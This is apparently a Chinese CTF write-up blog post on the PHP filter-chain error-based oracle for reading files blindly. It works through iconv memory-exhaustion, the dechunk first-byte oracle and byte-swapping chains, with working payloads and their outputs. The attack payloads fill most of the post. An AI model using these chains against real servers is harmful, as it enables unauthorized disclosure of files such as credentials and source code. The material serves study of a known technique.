<!doctype html>
<html lang="zh"><head>
<title>PHP Filter链——基于oracle的文件读取攻击 - “我不是二次元!”</title>
<meta name="msvalidate.01" content="1FF1CDAB89F73F47F09FDB7EE1059FDE" />
<meta name="google-site-verification" content="h9oKh1TF3yoRruKT3WlUVZjvkSiR172joz61JoqHXCM" />
<meta charset="UTF-8">
<meta name="keywords" content="">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">

<link rel="shortcut icon" href="/images/2.ico" type="image/x-icon" />
<meta name="description" content="简介​	一开始见这题今年红明谷的ezphp,利用文件包含来进行测信道攻击获得flag.php的源码,接着利用匿名类来执行命令.不过最初的原题是DownUnder CTF 2022 1&lt;?php file($_POST[0]);  ​	file读取一个文件，但不输出其内容.最终解法就是通过测信道攻击,用报错来预测根目录的flag的文件内容.  一.攻击原理大致分为3步:  通过iconv函数编">
<meta property="og:type" content="article">
<meta property="og:title" content="PHP Filter链——基于oracle的文件读取攻击">
<meta property="og:url" content="https://m1racle-7.github.io/2024/10/07/PHP%20Filter%E9%93%BE%E2%80%94%E2%80%94%E5%9F%BA%E4%BA%8Eoracle%E7%9A%84%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%94%BB%E5%87%BB/index.html">
<meta property="og:site_name" content="“我不是二次元!”">
<meta property="og:description" content="简介​	一开始见这题今年红明谷的ezphp,利用文件包含来进行测信道攻击获得flag.php的源码,接着利用匿名类来执行命令.不过最初的原题是DownUnder CTF 2022 1&lt;?php file($_POST[0]);  ​	file读取一个文件，但不输出其内容.最终解法就是通过测信道攻击,用报错来预测根目录的flag的文件内容.  一.攻击原理大致分为3步:  通过iconv函数编">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang20241007213836.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang20241007213845.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang20241007213849.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang20241007213855.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang20241007213907.png">
<meta property="article:published_time" content="2024-10-07T13:35:38.907Z">
<meta property="article:modified_time" content="2024-11-07T05:09:35.022Z">
<meta property="article:author" content="Miracle">
<meta property="article:tag" content="PHP">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang20241007213836.png">

<link rel="stylesheet" href="/lib/fancybox/fancybox.css">
<link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">


<link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1732530874491">

<link rel="stylesheet" href="/css/style.css?v=1732530874491">




    
        <link rel="stylesheet" href="/custom.css?v=1732530874491">
    



<script src="/lib/mdui_043tiny/mdui.js" async></script>
<script src="/lib/fancybox/fancybox.umd.js" async></script>
<script src="/lib/lax.min.js" async></script>


<script async src="/js/app.js?v=1732530874491"></script>

 

<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-4D4ZJ9G024"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag("js", new Date());

  gtag("config", "G-4D4ZJ9G024");
</script>


<link rel="stylesheet"  href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/atom-one-dark.min.css">
<meta name="generator" content="Hexo 7.3.0"></head><body class="nexmoe mdui-drawer-body-left"><div id="nexmoe-background"><div class="nexmoe-bg" style="background-image: url(/images/b.png)"></div><div class="mdui-appbar mdui-shadow-0"><div class="mdui-toolbar"><a class="mdui-btn mdui-btn-icon mdui-ripple" mdui-drawer="{target: &#039;#drawer&#039;, swipe: true}" title="menu"><i class="mdui-icon nexmoefont icon-menu"></i></a><div class="mdui-toolbar-spacer"></div><a class="mdui-btn mdui-btn-icon" href="/" title="Miracle"><img src="/images/a.jpg" alt="Miracle"></a></div></div></div><div id="nexmoe-header"><div class="nexmoe-drawer mdui-drawer" id="drawer">
    <div class="nexmoe-avatar mdui-ripple">
        <a href="/" title="Miracle">
            <img src="/images/a.jpg" alt="Miracle" alt="Miracle">
        </a>
    </div>
    <div class="nexmoe-count">
        <div><span>文章</span>8</div>
        <div><span>标签</span>4</div>
        <div><span>分类</span>4</div>
    </div>
    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
            <div class="mdui-list-item-content">
                回到首页
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/archive.html" title="文章归档">
            <i class="mdui-list-item-icon nexmoefont icon-container"></i>
            <div class="mdui-list-item-content">
                文章归档
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/PY.html" title="友链">
            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
            <div class="mdui-list-item-content">
                友链
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="sitemap">
            <i class="mdui-list-item-icon nexmoefont s"></i>
            <div class="mdui-list-item-content">
                sitemap
            </div>
        </a>
        
    </div>
    
    
        
        <div class="nexmoe-widget-wrap">
    <div class="nexmoe-widget nexmoe-search">
        
            <form id="search_form">
                <label><input class="st-default-search-input" id="search_value" name="q" type="search" placeholder="搜索" style="
                    font-size: 15px !important;
                    height: 56px !important;
                    background-image: none;
                "></label>
            </form>
         
    </div>
</div>


	<script async src="/js/search.js?v=1732530874492"></script>



    
        
        
        
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">文章分类</h3>
    <div class="nexmoe-widget">

      <ul class="category-list">

        


        

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/CTF/">CTF</a>
          <span class="category-list-count">4</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/PHP/">PHP</a>
          <span class="category-list-count">2</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/linux/">linux</a>
          <span class="category-list-count">1</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/内网/">内网</a>
          <span class="category-list-count">1</span>
        </li>

        
      </ul>

    </div>
  </div>


    
        
        
  <div class="nexmoe-widget-wrap">
    <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/PHP/" style="font-size: 15px;">PHP</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/%E5%86%85%E7%BD%91/" style="font-size: 10px;">内网</a>
    </div>
    
      <script>
        var maxTagcloud = parseInt(17);
        var tags_length = parseInt(4);
        var tags_arr = [];
        for(var i = 0; i < tags_length; i++){
          tags_arr.push(i);
        }
        tags_arr.sort(function (l, r) {
          return Math.random() > 0.5 ? -1 : 1;
        });
        tags_arr = tags_arr.slice(0, maxTagcloud < tags_length ? tags_length - maxTagcloud : 0);
        for(var tag_i = 0; tag_i < tags_arr.length; tag_i++){
          document.getElementById("randomtagcloud").children[tags_arr[tag_i]].style.display = 'none';
        }
      </script>
    
  </div>

    
        
        
        
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">文章归档</h3>
    <div class="nexmoe-widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/">2024</a><span class="archive-list-count">8</span></li></ul>
    </div>
  </div>



    
        
        
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">最新文章</h3>
    <div class="nexmoe-widget">
      <ul>
        
          <li>
            <a href="/2024/11/11/2024%E9%B9%8F%E5%9F%8E%E6%9D%AFWP/">2024鹏城杯WP</a>
          </li>
        
          <li>
            <a href="/2024/11/04/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8Bkerberos%E8%AE%A4%E8%AF%81/">域渗透之Kerberos认证</a>
          </li>
        
          <li>
            <a href="/2024/10/30/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-WriteUp/">网鼎杯-青龙组WP</a>
          </li>
        
          <li>
            <a href="/2024/10/21/2024%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81WP/">2024强网拟态WP-- by MYGO!!!</a>
          </li>
        
          <li>
            <a href="/2024/10/09/%E6%97%A0curl%E3%80%81wget%E8%AE%BF%E9%97%AE%E4%B8%8B%E8%BD%BD%E4%BA%92%E8%81%94%E7%BD%91%E8%B5%84%E6%BA%90/">无curl、wget下的环境来访问下载工具</a>
          </li>
        
      </ul>
    </div>
  </div>

    
   
    <div class="nexmoe-copyright">
        &copy; 2024 Miracle
        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
        
        <div style="font-size: 13px">
            <link rel="stylesheet" href="https://widget.heweather.net/standard/static/css/he-standard.css?v=1.4.0"><script src="https://widget.heweather.net/standard/static/js/he-standard.js?v=1.4.0"></script><script async="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            本站总访问量  <a id="busuanzi_value_site_pv"></a> 次<br>
            本站访客数<a id="busuanzi_value_site_uv"></a>人次
    </div>
    </div>
</div><!-- .nexmoe-drawer --></div><div id="nexmoe-content"><div class="nexmoe-primary"><div class="nexmoe-post">
  <article>
    
        <div class="nexmoe-post-cover"> 
            <img src="/images/b.png" alt="PHP Filter链——基于oracle的文件读取攻击" loading="lazy">
            <h1>PHP Filter链——基于oracle的文件读取攻击</h1>
        </div>
    
    
    <div class="nexmoe-post-meta">
    <div class="nexmoe-rainbow">
        <a class="nexmoefont icon-calendar-fill">2024年10月07日</a>
        
            <a class="nexmoefont icon-appstore-fill -link" href="/categories/PHP/">PHP</a>
        
        
    <a><i class="nexmoefont icon-areachart"></i>约5.8k字</a>
    <a><i class="nexmoefont icon-time-circle-fill"></i>预计需要24分钟</a>

    </div>
    
    
    
    
    
</div>

    <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>​	一开始见这题今年红明谷的ezphp,利用文件包含来进行测信道攻击获得flag.php的源码,接着利用匿名类来执行命令.不过最初的原题是<strong>DownUnder CTF 2022</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">file</span>(<span class="variable">$_POST</span>[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure>

<p>​	<code>file</code>读取一个文件，但不输出其内容.最终解法就是通过测信道攻击,用报错来预测根目录的flag的文件内容.</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang20241007213836.png" alt="image-20240526181459383" data-caption="image-20240526181459383" loading="lazy"></p>
<h1 id="一-攻击原理"><a href="#一-攻击原理" class="headerlink" title="一.攻击原理"></a>一.攻击原理</h1><p>大致分为3步:</p>
<ul>
<li>通过iconv函数编码导致php产生内存报错</li>
<li>利用dechunk来确定文件第一个字符</li>
<li>利用能改变字节顺序的编码,利用iconv将剩余字符与第一个字符交换</li>
</ul>
<h2 id="1-通过编码来使PHP产生内存错误"><a href="#1-通过编码来使PHP产生内存错误" class="headerlink" title="1.通过编码来使PHP产生内存错误"></a>1.通过编码来使PHP产生内存错误</h2><p>​	众所周知,PHP Filter 当中有一种 <code>convert.iconv</code> 的 Filter ,可以把数据从字符集A转换成字符集B</p>
<p>例:<code>php://filter/convert.iconv.&lt;source-encoding&gt;.&lt;target-encoding&gt;/resource=&lt;filename&gt;</code></p>
<p><strong>核心:convert.iconv.L1.UCS-4LE 编码</strong></p>
<p>UCS-4编码使用固定4个字节来表示每个字符,其中UCS-4LE即:使最低有效字节存储在最前面</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;$string = &quot;START&quot;; echo strlen(iconv(&quot;UTF8&quot;, &quot;UCS-4LE&quot;, $string)).&quot;\n&quot;;&#x27;</span><br><span class="line">输出20</span><br><span class="line">php -r &#x27;$string = &quot;START&quot;; echo iconv(&quot;UTF8&quot;, &quot;UCS-4LE&quot;,iconv(&quot;UTF8&quot;, &quot;UCS-4LE&quot;, $string));&#x27; | xxd</span><br></pre></td></tr></table></figure>

<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang20241007213845.png" alt="image-20240526140753648" data-caption="image-20240526140753648" loading="lazy"></p>
<p>​	在php中,php.ini的memory_limit参数代表了资源限制,默认值为128MB,如果试图读取大于128MB的文件时就会触发内存错误.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;memory_limit&#x27;</span>, <span class="string">&#x27;128M&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;START&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt;= <span class="number">13</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UTF8&quot;</span>, <span class="string">&quot;UCS-4LE&quot;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>例如这串代码,将字符串START使用了13次UCS-4LE编码,产生内存错误</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang20241007213849.png" alt="image-20240526135923121" data-caption="image-20240526135923121" loading="lazy"></p>
<h2 id="2-使文件泄露第一个字符"><a href="#2-使文件泄露第一个字符" class="headerlink" title="2.使文件泄露第一个字符"></a>2.使文件泄露第一个字符</h2><p>​	在php文档中可以找到<a target="_blank" rel="noopener" href="https://github.com/php/php-src/blob/01b3fc03c30c6cb85038250bb5640be3a09c6a32/ext/standard/filters.c#L1724">php filter dechunk</a>这里,其中对字符处理时有限制,只能处理a-fA-F0-9这个区间中,这是因为对于http中的chunk编码是以16进制来表长度的,所以16进制字符范围在a-fA-F0-9这个范围内.</p>
<p>​	根据源码可知,php支队第一个字节进行判断,第二个字节无关紧要.</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(file_get_contents(&quot;php://filter/dechunk/resource=data:,a&quot;));</span><br><span class="line">string(0) &quot;&quot;</span><br><span class="line">php &gt; var_dump(file_get_contents(&quot;php://filter/dechunk/resource=data:,g&quot;));</span><br><span class="line">string(1) &quot;g&quot;</span><br><span class="line">php &gt; var_dump(file_get_contents(&quot;php://filter/dechunk/resource=data:,ga&quot;));</span><br><span class="line">string(2) &quot;ga&quot;</span><br><span class="line">php &gt; var_dump(file_get_contents(&quot;php://filter/dechunk/resource=data:,ag&quot;));</span><br><span class="line">string(0) &quot;&quot;</span><br></pre></td></tr></table></figure>

<p>可以发现,在使用dechunk filter时,如果我们要编码的字符第一个字节不在16进制编码范围内,php回原样输出,在范围内的话会输出为空.</p>
<p>​	因为<strong>dechunk</strong>存在着<strong>判断</strong>的机制,所以我们可以利用这个机制来作为我们的oracle攻击,此外,我们开可以配合前面的<strong>convert.iconv.L1.UCS-4LE</strong> 编码,经过多段convert.iconv.L1.UCS-4LE 编码后,如果我们想要泄漏的字符串内容开头的字符范围在16进制编码范围内,因为有dechunk编码会清空字符串,就不会产生内存报错,如果不在就会继续原样输出最后导致报错.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">当前flag文件首字母为a</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://filter/convert.base64-encode|convert.base64-encode|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE/resource=flag&quot;</span>));</span><br><span class="line">不报错</span><br><span class="line">再加一层</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://filter/convert.base64-encode|convert.base64-encode|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE/resource=flag&quot;</span>));</span><br><span class="line">报错</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://filter/dechunk/convert.base64-encode|convert.base64-encode|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE/resource=flag&quot;</span>));</span><br><span class="line">不报错</span><br></pre></td></tr></table></figure>

<p>所以我们目前可以判断文件中的第一个字符是否在16进制编码这个范围内了,不过现在只能判断第一个字节,接下来就是处理剩余的字节了.</p>
<h2 id="3-泄露剩余字节"><a href="#3-泄露剩余字节" class="headerlink" title="3.泄露剩余字节"></a>3.泄露剩余字节</h2><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang20241007213855.png" alt="image-20240526180050145" data-caption="image-20240526180050145" loading="lazy"></p>
<h3 id="a-处理前4个字节"><a href="#a-处理前4个字节" class="headerlink" title="a.处理前4个字节"></a>a.处理前4个字节</h3><p>​	目前我们可以判断第一个字节了,由于我们使用的时php:&#x2F;&#x2F;filter,那么<strong>有没有一种编码可以交换字符串中的字符位置呢?</strong></p>
<p>以此为目的我们可以寻找到:</p>
<p><strong>convert.iconv.CSUNICODE.UCS-2BE</strong>这个编码规则,将unicode转成ucs-2BE,利用这个编码规则我们可以前后交换每两个字节的位置,将他称为<strong>r2</strong></p>
<p>例如:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://filter/convert.iconv.CSUNICODE.UCS-2BE/resource=data:,abcdefgh&quot;</span>));</span><br><span class="line"><span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;badcfehg&quot;</span></span><br></pre></td></tr></table></figure>

<p>使用 <strong>convert.iconv.UCS-4LE.10646-1:1993</strong> 我们可以将每四个字节的位置逆序，我们称这个编码规则为 <strong>r4</strong> </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://filter/convert.iconv.UCS-4LE.10646-1:1993/resource=data:,abcdefgh&quot;</span>));</span><br><span class="line"><span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;dcbahgfe&quot;</span></span><br></pre></td></tr></table></figure>

<p>所以我们现在可以找到源字符串中的第一个,第二个和第四个字节,那么第三个以及其他字节呢?</p>
<p>对于第三个字节,我们可以先将他r2,再进行一次r4即可把c放在第一位:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://filter/convert.iconv.CSUNICODE.UCS-2BE|convert.iconv.UCS-4LE.10646-1:1993/resource=data:,abcdefgh&quot;</span>));</span><br><span class="line"><span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;cdabghef&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>这样前4个字节我们都可以判断</strong>了,但是之后的呢?似乎不能通过r2和r4规则来放到前半部分,</p>
<p>​	这时我们可以想到之前的<strong>filterchain</strong>知识,利用filter协议通过各种编码规则组合来对空文件进行写入一句话木马.当时利用的是PHP再处理BASE64字符串时会完全忽略非法字符,我们可以通过一些编码规则来将非法字符添加到字符串最前端,再利用r2&#x2F;r4组合交换顺序,再利用base64decode清除非法字符即可完成把后续字符交换到前面的操作了.</p>
<p>例如<strong>convert.iconv.CSUNICODE.CSUNICODE</strong> 编码规则,它可以将字符串最前端加上0xff0xfe</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://filter/convert.iconv.CSUNICODE.CSUNICODE/resource=data:,abcdef&quot;</span>));</span><br><span class="line"><span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;��abcdef&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 r4 进行移位</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://filter/convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993/resource=data:,abcdef&quot;</span>));</span><br><span class="line"><span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;ba��fedc&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 base64 去掉冗余位</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://filter/convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993|convert.base64-decode|convert.base64-encode/resource=data:,abcdef&quot;</span>));</span><br><span class="line"><span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;bafedQ==&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 再次使用 r4 交换位置</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://filter/convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993|convert.base64-decode|convert.base64-encode|convert.iconv.UCS-4LE.10646-1:1993/resource=data:,abcdef&quot;</span>));</span><br><span class="line"><span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;efab==Qd&quot;</span></span><br></pre></td></tr></table></figure>

<p>不过这里还有一个问题,这里测试的时候用的是6个字节,因为r4编码规则对字节有要求,一定要4个字节为一组,所以我们需要想一些其他办法.</p>
<h3 id="b-对于base64两个等号的处理"><a href="#b-对于base64两个等号的处理" class="headerlink" title="b.对于base64两个等号的处理"></a>b.对于base64两个等号的处理</h3><p>回顾一下上述过程,<strong>r4编码</strong>规则有两处利用点:</p>
<p>一个是产生填充字符后进行交换,标记为(1).</p>
<p>一个是利用base64消除填充字符后,标记为(2).</p>
<p>对于(1),对于要移位的字符串,<strong>我们尽可能让他长度满足4*n-2</strong>即可,但是我们根本不知道字符串原本长度是多少.</p>
<p>​	不过好在base64编码长度都是<code>4*n</code>个字节,但是我们还是需要另外两个字节,因为再base64编码中,分组编码完成后,不足分组编码的会<strong>使用&#x3D;进行填充</strong>,所以我们可以<strong>利用这两个等号来进行一定的变换</strong>操作,使得其他字节不变的情况下满足<code>4*n-2</code>的长度条件.</p>
<p>题目作者找到了这个<strong>filter</strong>:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://filter/convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7/resource=data:,==&quot;</span>));</span><br><span class="line"><span class="keyword">string</span>(<span class="number">24</span>) <span class="string">&quot;+---AD0-3D3D+---AD0-3D3D&quot;</span></span><br></pre></td></tr></table></figure>

<p>**这个filter会固定将两个等号转换成另一个长度为24的字符串,*<em>所以原本的字符串长度就变为 *<em>4</em>n-2+24 &#x3D; 4*(n+6) - 2</em>* 也是符合了我们上述的长度要求！</p>
<p>所以我们现在以abcdefghij&#x3D;&#x3D;来测试一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将等号进行转换</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://filter/convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7/resource=data:,abcdefghij==&quot;</span>));</span><br><span class="line"><span class="keyword">string</span>(<span class="number">34</span>) <span class="string">&quot;abcdefghij+---AD0-3D3D+---AD0-3D3D&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 在前端添加冗余字符串</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://filter/convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.CSUNICODE.CSUNICODE/resource=data:,abcdefghij==&quot;</span>));</span><br><span class="line"><span class="keyword">string</span>(<span class="number">36</span>) <span class="string">&quot;��abcdefghij+---AD0-3D3D+---AD0-3D3D&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 r4</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://filter/convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993/resource=data:,abcdefghij==&quot;</span>));</span><br><span class="line"><span class="keyword">string</span>(<span class="number">36</span>) <span class="string">&quot;ba��fedcjihg---+-0DAD3D3---+-0DAD3D3&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 去除冗余</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://filter/convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993|convert.base64-decode|convert.base64-encode/resource=data:,abcdefghij==&quot;</span>));</span><br><span class="line"><span class="keyword">string</span>(<span class="number">28</span>) <span class="string">&quot;bafedcjihg+0DAD3D3+0DAD3Dw==&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>经过这4步操作后,再利用一下r4即可将e放在第一个字节上.</p>
<p>​	这4步流程在作者的原本脚本上本定义为一个flip操作,也就是一个flip流程包括:<strong>等号转换,添加冗余,r4转换,去除冗余</strong>四个步骤.</p>
